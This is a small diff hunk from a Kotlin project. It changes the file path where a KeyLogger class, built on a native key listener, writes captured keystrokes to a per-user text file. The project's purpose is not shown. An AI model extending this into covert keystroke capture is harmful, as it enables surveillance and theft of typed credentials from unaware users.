@@ -12,7 +12,7 @@ import kotlin.system.exitProcess
 
 class KeyLogger(username: String) : Logger, NativeKeyListener {
 
-    private val mPathToFile = "${System.getProperty("user.dir")}\\data\\${username}_Keys.txt"
+    private val mPathToFile = "${System.getProperty("user.dir")}/data/${username}_Keys.txt"
 
     private var mFile = File(mPathToFile)
 
